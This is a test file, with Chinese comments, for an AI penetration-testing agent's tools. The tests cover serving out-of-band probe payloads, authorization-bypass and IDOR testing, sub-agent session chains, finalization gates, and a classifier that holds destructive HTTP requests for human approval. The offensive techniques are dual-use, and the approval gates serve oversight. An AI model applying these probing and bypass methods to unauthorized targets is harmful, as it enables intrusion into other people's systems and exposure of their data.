  // [local.16 裁定] 只给局域网 URL：不返回 localUrl/127.0.0.1 形态，杜绝 POC 写成 localhost
  assert.equal(started.localUrl, void 0, "no localUrl field (rule: no 127.0.0.1/localhost in POCs)");
  assert.ok(!started.url.includes("127.0.0.1") && !started.url.includes("localhost"), "url is LAN IP");
  // HTTP GET 命中内���
  const res = await fetch(started.url);
  const body = await res.text();
  assert.ok(body.includes("<script>"), "payload served");
  // 随意路径也命中同一内容（OOB 探针常用任意路径）
  const probe = await fetch(new URL("/probe?x=1", started.url));
  assert.equal(await probe.text(), body);
  // stop → 日志回传 + 端口关闭
  const stopped = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
  assert.equal(stopped.stopped, true);
  assert.equal(stopped.hits.length, 2, "two hits logged");
  assert.ok(stopped.hits[0].at && stopped.hits[0].ua !== void 0, "hit fields (time + UA)");
  assert.ok(stopped.hits.some((hit) => hit.path === "/probe?x=1"), "probe path recorded");
  await assert.rejects(() => fetch(started.url), "port closed after stop");
  // 再次 stop → 幂等 not-found
  const again = await h.run("src_stop_serve", { serveId: started.serveId }, parent);
  assert.equal(again.stopped, false);
  // 跨会话隔离：另一会话停不掉 srv1 的服务
  const other = h.exec("srv2");
  await h.run("src_add_goal", { target: "other.test", objective: "serve2" }, other);
  const s2 = await h.run("src_serve_proof", { payload: "second", filename: "b.txt", contentType: "text/plain" }, other);
  const cross = await h.run("src_stop_serve", { serveId: s2.serveId }, parent);
  assert.equal(cross.stopped, false, "cross-session stop rejected");
  await h.run("src_stop_serve", { serveId: s2.serveId }, other);
  // [local.16 自查] goal 重置（initGoal 二次调用）自动关闭本会话服务
  await h.run("src_add_goal", { target: "example.test", objective: "restart" }, parent);
  await assert.rejects(() => fetch(started.url), "server closed on goal reset");
});

test("[local.16] src_update_finding 投影折叠：UI 视角（viewSrcState）字段重写/校验拒绝/asset 关联解除", async () => {
  const { srcInitialState, applySrcEvent, viewSrcState } = await import("../lib/src.js");
  const ev = (name, args) => ({ type: "tool/call", data: { name, arguments: JSON.stringify(args) } });
  const findingOf = (s) => viewSrcState(s).nodes.find((n) => n.kind === "finding");
  let s = srcInitialState;
  s = applySrcEvent(s, ev("src_add_goal", { target: "example.test", objective: "x" }));
  s = applySrcEvent(s, ev("src_add_intent", { title: "t", detail: "d", goalId: "goal-1" }));
  s = applySrcEvent(s, ev("src_add_finding", { intentId: "intent-1", title: "F1", severity: "low", impact: "i".repeat(50), affectedScope: "s", remediation: "r", pocEvidence: ["e"], reproducibleSteps: ["g"] }));
  s = applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "medium", victimImpact: "受害者视角内容足够长三十字以上了吧", reproducibleSteps: ["step1", "step2"], title: "F1-renamed" }));
  const f = findingOf(s);
  assert.equal(f.severity, "medium");
  assert.equal(f.title, "F1-renamed");
  assert.ok(f.victimImpact.includes("受害者"));
  assert.equal(f.steps.length, 2);
  // 非法 severity / 未知 id / 无效 asset 引用 → 原样返回
  assert.equal(findingOf(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-1", severity: "catastrophic" }))).severity, "medium");
  assert.ok(!viewSrcState(applySrcEvent(s, ev("src_update_finding", { findingId: "finding-99", title: "ghost" }))).nodes.some((n) => n.title === "ghost"));
  // asset 关联与空串解除
  const s4 = applySrcEvent(s, ev("src_add_asset", { type: "root-domain", value: "a.test" }));
  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" }))).affectedAssetId, "asset-1");
  assert.equal(findingOf(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-404" }))).affectedAssetId, void 0);
  assert.equal(findingOf(applySrcEvent(applySrcEvent(s4, ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "asset-1" })), ev("src_update_finding", { findingId: "finding-1", affectedAssetId: "" }))).affectedAssetId, void 0);
});

test("[local.17] 委派子代理执行类工具沿 parentSession 链解析 goal/infra/intent（fork 场景修复）", async () => {
  const h = harness();
  const commander = h.exec("cmd-1");
  // fork 子代理：header.parentSession 指向指挥官；ctx.sessions.get(parent) 无 header 也应终止遍历
  const child = h.exec("child-fork", "cmd-1");

  await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment", authorization: "ticket-42" }, commander);
  const intent = await h.run("src_add_intent", { title: "Bypass filter list", detail: "vector enumeration", goalId: "goal-1" }, commander);
  await h.run("src_set_infra", { key: "proxyUrl", value: "http://127.0.0.1:18080" }, commander);

  // 修复前：子代理直接调 src_scan_surface 会报 "requires an initialized SRC goal"
  const surface = await h.run("src_scan_surface", { intentId: intent.id, baseUrl: "https://example.test", paths: ["/", "/robots.txt"] }, child);
  assert.ok(surface, "child with fork parent resolves the engagement goal via the parent chain");

  // src_get_infra 子代理可读且读到指挥官的覆盖值
  const infra = await h.run("src_get_infra", {}, child);
  assert.equal(infra.infra.proxyUrl, "http://127.0.0.1:18080");

  // 孙链（两层以上）也能回溯：child2 -> child-fork -> cmd-1
  h.sessions.get("child-fork").header = { parentSession: "cmd-1" };
  const grandchild = h.exec("grandchild", "child-fork");
  const surface2 = await h.run("src_scan_surface", { intentId: intent.id, baseUrl: "https://example.test", paths: ["/robots.txt"] }, grandchild);
  assert.ok(surface2, "two-level chain still resolves the engagement session");
});

test("[local.17] 无链上 goal 时报错文案保持不变（orphan 子代理）", async () => {
  const h = harness();
  const orphan = h.exec("orphan", "nobody");
  await assert.rejects(
    () => h.run("src_scan_surface", { intentId: "intent-x", baseUrl: "https://example.test", paths: ["/"] }, orphan),
    /requires an initialized SRC goal/
  );
});

await test("local.17: src_submit 省略 findings/assets 不再报 invalid arguments", async () => {
  const h = harness();
  const parent = h.exec("parent");
  h.sessions.set("parent", { append() {} });
  const child = h.exec("child", "parent");
  const goal = await h.run("src_add_goal", { target: "https://example.test", objective: "authorized SRC assessment" }, parent);
  const intent = await h.run("src_add_intent", { title: "Only facts batch", goalId: goal.id }, parent);
  // 只传 facts，省略 assets/findings——此前 parameters required: true 导致 ToolArgsError
  const result = await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "facts only", facts: [{ kind: "info", target: "https://example.test", detail: "server banner", confidence: 0.8 }] }, child);
  assert.deepEqual({ facts: result.facts, assets: result.assets, findings: result.findings }, { facts: 1, assets: 0, findings: 0 });
  // 全部数组都省略也应成功（仅 checkpoint）
  const empty = await h.run("src_submit", { intentId: intent.id, stage: "progress", summary: "checkpoint only" }, child);
  assert.equal(empty.facts, 0);
});

test("[capability] src_list_capabilities 读取清单并对照 patch 接线区段", async () => {
  const h = harness();
  const os = await import("node:os");
  const fs = await import("node:fs");
  const path = await import("node:path");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "caps-test-"));
  fs.mkdirSync(path.join(tmp, "profiles", "web"), { recursive: true });
  fs.writeFileSync(path.join(tmp, "capabilities.yaml"), [
    "capabilities:",
    "  - id: alpha",
    "    from: npm:@t/alpha@1.0.0",
    "    enabled: true",
    "    when: >",
    "      测试场景 A 续行",
    "  - id: beta",
    "    from: npm:@t/beta@2.0.0",
    "    enabled: false"
  ].join("\n"));
  fs.writeFileSync(path.join(tmp, "profiles", "web", "cordis.patch.yml"), [
    "# ── dsh-src capabilities:8< 自动生成区段开始 ──",
    "- insert:",
    "    - id: mcp-alpha",
    "# ── dsh-src capabilities:>8 自动生成区段结束 ──"
  ].join("\n"));
  const prevHome = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  try {
    const r = await h.run("src_list_capabilities", {}, h.exec("cmd-1"));
    assert.equal(r.items.length, 2);
    const alpha = r.items.find((x) => x.id === "alpha");
    const beta = r.items.find((x) => x.id === "beta");
    assert.deepEqual({ id: alpha.id, enabled: alpha.enabled, wired: alpha.wired, when: alpha.when }, { id: "alpha", enabled: true, wired: true, when: "测试场景 A 续行" });
    assert.deepEqual({ enabled: beta.enabled, wired: beta.wired }, { enabled: false, wired: false });
    // 清单缺失场景
    process.env.DSH_HOME = path.join(tmp, "nope");
    const r2 = await h.run("src_list_capabilities", {}, h.exec("cmd-2"));
    assert.equal(r2.parseError, "清单未创建");
    assert.deepEqual(r2.items, []);
  } finally {
    if (prevHome === void 0) delete process.env.DSH_HOME; else process.env.DSH_HOME = prevHome;
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("[capability] parseCapsYamlSubset 容错与折叠块", async () => {
  const { execFile } = await import("node:child_process");
  const { promisify } = await import("node:util");
  // 直接经模块内函数不可行（非导出），改由 src_list_capabilities 行为覆盖：畸形文件应报解析失败而非崩溃
  const h = harness();
  const os = await import("node:os");
  const fs = await import("node:fs");
  const path = await import("node:path");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "caps-bad-"));
  fs.writeFileSync(path.join(tmp, "capabilities.yaml"), "garbage line without structure\n");
  const prevHome = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  try {
    const r = await h.run("src_list_capabilities", {}, h.exec("cmd-3"));
    assert.match(r.parseError, /解析失败|应以/);
    assert.deepEqual(r.items, []);
  } finally {
    if (prevHome === void 0) delete process.env.DSH_HOME; else process.env.DSH_HOME = prevHome;
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

test("[local.20] finalize 收官三闸：blocked 无待办拦截 + 待办关联豁免 + 报告尾节「等你的事」", async () => {
  const h = harness();
  const parent = h.exec("g20");
  await h.run("src_add_goal", { target: "https://shop.example.test", objective: "收官闸门", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "登录态越权面", detail: "需商家账号", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "blocked" }, parent);
  // 闸②：blocked intent 存在但从未建任何待办 → blocker
  const noTodo = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(noTodo.ready, false);
  assert.match(noTodo.blockers.join(" "), /标记为 blocked 但从未创建任何用户待办/);
  // 建待办（intentId 关联）后闸②解除；闸①pending 待办仍拦
  await h.run("src_user_todo", { title: "登录 shop.example.test 提供商家会话", kind: "auth-session", intentId: "intent-1" }, parent);
  const withTodo = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(withTodo.ready, false, "pending todo blocks finalize");
  assert.match(withTodo.blockers.join(" "), /未完成的用户待办/);
  assert.doesNotMatch(withTodo.blockers.join(" "), /从未创建任何用户待办/, "linked todo clears gate 2");
  // allowIncomplete 越过两闸
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }], allowIncomplete: true, allowIncompleteReason: "用户指示暂停" }, parent);
  assert.equal(allowed.ready, true);
  // 报告尾节：pending 待办 + blocked intent 都进「⏸ 等你的事」
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /⏸ 等你的事/);
  assert.match(report.markdown, /登录 shop\.example\.test 提供商家会话/);
  assert.match(report.markdown, /intent-1\/登录态越权面/);
});

test("[local.20] finalize remainingDirections 必填：缺失抛错、非空拦截、空数组放行", async () => {
  const h = harness();
  const parent = h.exec("g20b");
  await h.run("src_add_goal", { target: "example.test", objective: "方向闸", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  await assert.rejects(() => h.run("src_finalize_engagement", {}, parent), /remainingDirections/);
  const listed = await h.run("src_finalize_engagement", { remainingDirections: ["深挖 /api/admin 越权", "GraphQL schema 复核"], blindSpots: [{ dimension: "http-authz-surface", status: "notApplicable" }, { dimension: "cors-headers", status: "notApplicable" }, { dimension: "dom-xhr", status: "notApplicable" }, { dimension: "dict-budget", status: "notApplicable" }, { dimension: "multi-account-cross-authz", status: "notApplicable" }] }, parent);
  assert.equal(listed.ready, false);
  assert.match(listed.blockers.join(" "), /可继续推进的方向却要求收官/);
  assert.match(listed.blockers.join(" "), /GraphQL schema 复核/, "directions echoed back");
});

test("[local.22] blindSpots 覆盖维度声明闸：缺项/无证据/信号派生/报告渲染", async () => {
  const h = harness();
  const parent = h.exec("g22bs");
  await h.run("src_add_goal", { target: "https://example.test", objective: "盲区闸", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);

  // ① 缺 blindSpots 参数 → throw
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [] }, parent), /blindSpots/);

  // ② 缺项：漏 cors-headers 等 → blocker
  const partial = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.equal(partial.ready, false);
  assert.match(partial.blockers.join(" "), /覆盖维度声明缺项/);
  assert.match(partial.blockers.join(" "), /cors-headers/);

  // ③ covered 无 evidenceId → blocker
  const noEvidence = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.equal(noEvidence.ready, false);
  assert.match(noEvidence.blockers.join(" "), /evidenceId 缺失或不可解析/);
  assert.match(noEvidence.blockers.join(" "), /http-authz-surface/);

  // ④ covered 带真实 evidenceId → 放行；uncovered 多账号无待办 → warning
  const withEvidence = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered", evidenceId: "intent-1" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "uncovered", note: "缺第二测试账号" },
  ] }, parent);
  assert.match(withEvidence.warnings.join(" "), /multi-account-cross-authz|未建对应 src_user_todo/);

  // ⑤ 信号派生：wss 资产存在却未声明 websocket → 缺项阻断
  await h.run("src_add_asset", { type: "endpoint", value: "wss://api.example.test/ws", meta: "api:websocket" }, parent);
  const wsMissing = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "notApplicable" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent);
  assert.match(wsMissing.blockers.join(" "), /websocket/);

  // ⑥ allowIncomplete 越过，blindSpots 落 coverage 行 → 报告渲染「覆盖维度声明」
  const allowed = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "covered", evidenceId: "intent-1", note: "已测" },
    { dimension: "cors-headers", status: "uncovered", note: "未测响应头" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "uncovered", note: "缺多账号" },
    { dimension: "websocket", status: "uncovered", note: "无 ws 客户端能力" },
  ], allowIncomplete: true, allowIncompleteReason: "演示停止" }, parent);
  assert.equal(allowed.ready, true);
  const report = await h.run("src_report", {}, parent);
  assert.match(report.markdown, /覆盖维度声明/);
  assert.match(report.markdown, /http-authz-surface: 已覆盖/);
  assert.match(report.markdown, /websocket: 未覆盖/);
  assert.match(report.markdown, /无 ws 客户端能力/);
});

test("[local.22] blindSpots schema 校验：非法 status 被框架拒绝", async () => {
  const h = harness();
  const parent = h.exec("g22sch");
  await h.run("src_add_goal", { target: "https://example.test", objective: "schema", authorization: "t" }, parent);
  await h.run("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  // 非法 status 值应被 schema 拒绝（框架层 enum 校验）
  await assert.rejects(() => h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "maybe" },
    { dimension: "cors-headers", status: "notApplicable" },
    { dimension: "dom-xhr", status: "notApplicable" },
    { dimension: "dict-budget", status: "notApplicable" },
    { dimension: "multi-account-cross-authz", status: "notApplicable" },
  ] }, parent), /maybe|status|enum|invalid/i);
});

test("[local.23] testAccounts 列表：登记/去重/投影/向后兼容单值", async () => {
  const h = harness();
  const parent = h.exec("g23ac");
  await h.run("src_add_goal", { target: "https://example.test", objective: "矩阵", authorization: "t" }, parent);
  // 登记 A 账号
  const a = await h.run("src_add_test_account", { label: "商家账号A", credential: "Cookie: sid=aaa; role=merchant", note: "商家端" }, parent);
  assert.equal(a.updated, false);
  assert.match(a.id, /^testAccount-/);
  // 同 label 去重覆盖
  const a2 = await h.run("src_add_test_account", { label: "商家账号A", credential: "Cookie: sid=aaa2" }, parent);
  assert.equal(a2.updated, true);
  assert.equal(a2.id, a.id);
  // 登记 B 账号
  await h.run("src_add_test_account", { label: "管理员号B", credential: "Authorization: Bearer admintoken", note: "管理端" }, parent);
  const state = await h.run("src_state", {}, parent);
  assert.equal(state.testAccounts.length, 2);
  assert.equal(state.counts.testAccounts, 2);
  assert.equal(state.testAccounts.some((r) => r.label === "管理员号B"), true);
  // credential 不暴露进投影（只暴露 label/note/observationId）
  assert.equal(state.testAccounts.every((r) => !("credential" in r)), true);
  // 向后兼容：infra.testAccount 单值也进列表（label=legacy-infra）
  await h.run("src_set_infra", { key: "testAccount", value: "user:pass" }, parent);
  const state2 = await h.run("src_state", {}, parent);
  assert.equal(state2.testAccounts.some((r) => r.label === "legacy-infra"), true);
});

test("[local.23] 认证预算：src_test_bypass 计数 + budgetExhausted 软信号 + 401 连发 sessionLikelyExpired", async () => {
  const h = harness();
  const parent = h.exec("g23bud");
  await h.run("src_add_goal", { target: "https://example.test", objective: "预算", authorization: "t" }, parent);
  const intent = await h.run("src_add_intent", { title: "auth", goalId: "goal-1" }, parent);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "auth bypass", status: "hypothesis" }, parent);
  const originalFetch = globalThis.fetch;
  try {
    // 认证请求（带 Cookie）连续 401 → sessionLikelyExpired
    globalThis.fetch = async () => new Response("unauth", { status: 401, headers: { "content-type": "application/json" } });
    const result = await h.run("src_test_bypass", {
      intentId: intent.id, researchId: research.id, category: "authorization-bypass", baseUrl: "https://example.test",
      baseline: { method: "GET", path: "/api/me", headers: { cookie: "sid=abc" } },
      variants: [{ method: "GET", path: "/api/admin", headers: { cookie: "sid=abc" } }, { method: "GET", path: "/api/orders/1", headers: { cookie: "sid=abc" } }]
    }, parent);
    assert.equal(result.sessionLikelyExpired, true, "401 连发应触发 sessionLikelyExpired");
    // authBudget 在 view 里可见
    const state = await h.run("src_state", {}, parent);
    assert.equal(state.authBudget.limit, 30);
    assert.ok(state.authBudget.used >= 3, "认证请求应计数");
  } finally { globalThis.fetch = originalFetch; }
});

test("[local.24] 域笔记：登记/去重/跨会话积累 + src_add_goal priorContext briefing", async () => {
  const h = harness();
  // 会话 A：建目标 + 记域笔记 + 记已否 research + 记 finding
  const a = h.exec("s24a");
  await h.run("src_add_goal", { target: "cross-24.test", objective: "首轮", authorization: "t" }, a);
  const note = await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流 5rps", content: "burst 会 429，需降到 2rps 才稳。" }, a);
  assert.equal(note.updated, false);
  assert.match(note.id, /^domainNote-/);
  assert.equal(note.target, "cross-24.test");
  // 同目标+title 覆盖
  const note2 = await h.run("src_record_domain_note", { category: "pitfall", title: "api/v1 限流 5rps", content: "更正：实测 10rps 才 429。" }, a);
  assert.equal(note2.updated, true);
  assert.equal(note2.id, note.id);
  const intent = await h.run("src_add_intent", { title: "测 x", goalId: "goal-1" }, a);
  const research = await h.run("src_record_research", { intentId: intent.id, category: "authorization-bypass", hypothesis: "/admin 无鉴权可直访", status: "false-positive", stopReason: "/admin 有 302 跳登录，无直访" }, a);
  await h.run("src_add_finding", { title: "用户ID 可枚举他人订单 (IDOR)", severity: "high", intentId: intent.id, researchId: research.id, impact: "任意登录用户可读他人订单，收货人电话地址批量泄露可被用于精准诈骗与倒卖", affectedScope: "全部订单接口", remediation: "订单查询校验属主", victimImpact: "受害用户的订单收货人电话与地址被陌生人读取并可能遭诈骗骚扰且无从察觉", attackPrerequisites: "攻击者仅需注册普通账号登录后遍历订单 ID，无需任何管理权限", concreteLossEvidence: [research.id], reproducibleSteps: ["登录 A", "GET /api/orders/2"], pocEvidence: ["GET /api/orders/2 用 sid=A 的 cookie 返回他人订单"] }, a);
  // 列表
  const state = await h.run("src_state", {}, a);
  // 注：domain_notes 未进 view，但可通过新会话 src_add_goal 的 priorContext 验证

  // 会话 B：同目标开局 → priorContext 应含域笔记 + 已否假设 + findings
  const b = h.exec("s24b");
  const goal = await h.run("src_add_goal", { target: "cross-24.test", objective: "第二轮续测", authorization: "t" }, b);
  assert.ok(goal.priorContext, "同目标续测应返回 priorContext");
  assert.ok(Array.isArray(goal.priorContext.notes) && goal.priorContext.notes.length === 1, "应含1条域笔记");
  assert.equal(goal.priorContext.notes[0].title, "api/v1 限流 5rps");
  assert.ok(Array.isArray(goal.priorContext.falsifiedHypotheses) && goal.priorContext.falsifiedHypotheses.length === 1, "应含1条已否假设");
  assert.ok(goal.priorContext.falsifiedHypotheses[0].hypothesis.includes("/admin"), "已否假设应含 /admin 那条");
  assert.ok(Array.isArray(goal.priorContext.findings) && goal.priorContext.findings.length === 1, "应含1条已确认 finding");
  assert.equal(goal.priorContext.priorSessions, 1);

  // 不同目标开局 → 无 priorContext
  const c = h.exec("s24c");
  const goal2 = await h.run("src_add_goal", { target: "unrelated-24.test", objective: "无关目标" }, c);
  assert.equal(goal2.priorContext, undefined, "不同目标不应有 priorContext");
});

test("[local.24] 域笔记查看通道：src_list_domain_notes 只读清单 + src_state 投影", async () => {
  const h = harness();
  const a = h.exec("s24d");
  await h.run("src_add_goal", { target: "list-24.test", objective: "查看通道" }, a);
  // 未记笔记时：空清单
  const empty = await h.run("src_list_domain_notes", {}, a);
  assert.equal(empty.target, "list-24.test");
  assert.deepEqual(empty.notes, []);
  // 记两条不同 category
  await h.run("src_record_domain_note", { category: "fingerprint", title: "技术栈 Vue3+Spring", content: "前端 Vue3，后端 Spring Boot 2.x，/api/v2 前缀。" }, a);
  await h.run("src_record_domain_note", { category: "pitfall", title: "登录接口 5 次锁号", content: "连续 5 次错误密码锁 30 分钟。" }, a);
  // 只读清单：含两条，不含 content（精简投影）
  const listed = await h.run("src_list_domain_notes", {}, a);
  assert.equal(listed.notes.length, 2);
  assert.ok(listed.notes.every((n) => !("content" in n)), "清单不应含 content");
  assert.ok(listed.notes.some((n) => n.category === "fingerprint" && n.title === "技术栈 Vue3+Spring"));
  // src_state 投影：domainNotes 数组 + counts
  const state = await h.run("src_state", {}, a);
  assert.equal(state.domainNotes.length, 2);
  assert.equal(state.counts.domainNotes, 2);
  assert.ok(state.domainNotes.every((n) => !("content" in n)), "投影不应含 content");
  // 另一会话同目标：src_state 也能看到（跨会话共享）
  const b = h.exec("s24e");
  await h.run("src_add_goal", { target: "list-24.test", objective: "续测视角" }, b);
  const stateB = await h.run("src_state", {}, b);
  assert.equal(stateB.counts.domainNotes, 2, "跨会话应共享笔记");
  // 未初始化会话：空投影不报错
  const c = h.exec("s24f");
  const stateC = await h.run("src_state", {}, c);
  assert.deepEqual(stateC.domainNotes, []);
  assert.equal(stateC.counts.domainNotes, 0);
  // 无 goal 会话直接调 list：应报错（requires goal）
  await assert.rejects(() => h.run("src_list_domain_notes", {}, c), /src_add_goal/);
});

/* [local.26] 模块一-路线A：高危动作分类纯函数（不触网，不需 mock 服务器）。 */
test("[local.26] classifyHttpRequest 拦截红线：closeAccount GET+token+他人 id → 破坏性写入挂", () => {
  const v = classifyHttpRequest({ method: "GET", path: "/api-c/user/v1/closeAccount", headers: { userId: "15", authorization: "Bearer t" } });
  assert.equal(v.require, true, "closeAccount 必须挂起（真实美团红线复现）");
  assert.equal(v.category, "破坏性写入");
});
test("[local.26] classifyHttpRequest 越权：有 token + 写方法 + 他人资源 id → 越权删改挂", () => {
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/orders", headers: { authorization: "Bearer t" }, body: '{"userId":42}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "越权删改");
  assert.deepEqual(v.victimIds, [42]);
});
test("[local.26] classifyHttpRequest 未授权删改：无 token + 写方法 + 非读语义 path → 挂", () => {
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/user/register", headers: {}, body: '{"phone":"123"}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "未授权删改");
});
test("[local.26] classifyHttpRequest 放行：自己 token + 自己资源 id 的小写写不误报越权仍挂（代价可接受）", () => {
  /* 自己资源也可能命中"他人 id"枚举；为删改零漏，写+token+枚举 id 一律挂，批准即可执行。 */
  const v = classifyHttpRequest({ method: "POST", path: "/api/v1/profile", headers: { authorization: "Bearer t" }, body: '{"userId":1}' });
  assert.equal(v.require, true);
  assert.equal(v.category, "越权删改");
});
test("[local.26] classifyHttpRequest 放行：强读语义 path + 未授权探测 → 放行（白名单）", () => {
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/users/query?userId=3", headers: {} }).require, false);
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/orders/list", headers: {} }).require, false);
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/account/detail", headers: {} }).require, false);
});
test("[local.26] classifyHttpRequest 不误伤：preset 不命中 reset、enclose 不命中 close", () => {
  /* preset/config 是读 → 放行；enclose 是 POST+无 token+非读语义 → 未授权删改挂（不含破坏性词） */
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/preset/config", headers: {} }).require, false);
  const enclose = classifyHttpRequest({ method: "POST", path: "/api/v1/enclose", headers: {} });
  assert.equal(enclose.require, true);
  assert.equal(enclose.category, "未授权删改");
});
test("[local.26] classifyHttpRequest 破坏性词作为 GET 也挂：cancelOrder/deleteUser", () => {
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/orders/cancelOrder", headers: { authorization: "t" } }).category, "破坏性写入");
  assert.equal(classifyHttpRequest({ method: "GET", path: "/api/v1/deleteUser", headers: { authorization: "t" } }).category, "破坏性写入");
});
test("[local.26] classifyHttpRequest SMS 发包（软约束）：GET + 无 token + 读语义放行（设计可接受）", () => {
  /* sentVerificationCode 是 GET+副作用词但无破坏性词、非写方法 → 放行；发包拦截是软约束。 */
  const v = classifyHttpRequest({ method: "GET", path: "/api/v1/sms/sentVerificationCode?regionCode=JP&phoneNumber=9012345670", headers: {} });
  assert.equal(v.require, false);
});

/* [local.26] 模块一-路线A：src_http 工具集成——本地 mock HTTP 服务器（127.0.0.1，非厂商域名）。
 * 验证：放行请求直接转发；破坏性/越权/未授权删改请求挂起审批，批准后才转发，拒绝/无人审 fail-closed。 */
test("[local.26] src_http 放行读请求直接转发到本地 mock 服务器", async () => {
  const server = http.createServer((req, res) => { res.writeHead(200, { "content-type": "text/plain" }); res.end("ok-" + req.url); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const targetHost = "127.0.0.1";
  const h = harnessWithApproval({ policy: "allow" });
  const parent = h.exec("http1");
  await h.run("src_add_goal", { target: targetHost, objective: "mock 验证 src_http 放行" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://${targetHost}:${port}/api/v1/users/list`, method: "GET", justification: "读名单无破坏性" }, parent);
    assert.equal(result.approval, "allowed-auto");
    assert.equal(result.status, 200);
  } finally { server.close(); }
});
test("[local.26/31] src_http 破坏性请求挂起待审——拒绝则不发出（mock 收不到请求）", async () => {
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("http2");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "mock 验证破坏性待审拒绝" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "15", authorization: "Bearer t" }, justification: "删除 userId=15" }, parent);
    assert.equal(result.approval, "pending", "挂起待审不发出");
    assert.equal(result.status, 0, "挂起不应发出，status 为 0");
    assert.ok(/^approval-\d+$/.test(result.pendingApprovalId), "返回 pendingApprovalId");
    assert.equal(hitCount, 0, "mock 服务器不应收到任何请求");
    /* 用户在面板点拒绝 → agent 调 src_resolve_approval reject：仍不发出。 */
    const rejected = await h.run("src_resolve_approval", { id: result.pendingApprovalId, action: "reject", note: "可能误伤真实用户" }, parent);
    assert.equal(rejected.status, "rejected");
    assert.equal(rejected.responseStatus, 0, "拒绝不发出，responseStatus 为 0");
    assert.equal(hitCount, 0, "拒绝后 mock 仍不应收到请求");
  } finally { server.close(); }
});
test("[local.26/31] src_http 越权删改挂起——批准后才转发（mock 收到一次）", async () => {
